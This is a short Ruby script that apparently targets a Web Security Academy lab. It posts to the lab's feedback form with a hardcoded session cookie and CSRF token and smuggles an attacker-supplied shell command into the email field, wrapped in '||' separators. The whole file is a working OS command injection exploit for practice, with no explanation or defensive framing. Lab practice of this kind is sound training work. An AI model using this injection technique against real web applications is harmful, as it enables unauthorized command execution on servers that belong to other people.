require 'http'

url = "https://0a38006b034b43fa80bd30f300e80091.web-security-academy.net/feedback/submit"

client = HTTP.cookies(:session => "LRCUsPom0kCetkYNuE1G00cHOzMUHXBc").post(url,:form => {
		:csrf => "IXKFfAWW18hiK1Gd4f60iJ1fm4p1xlvQ",
		:name => "name",
		:email => "a@b.com||#{ARGV[0]}||",
		:subject => "anything",
		:message => "message"
	})

puts client.body.to_s

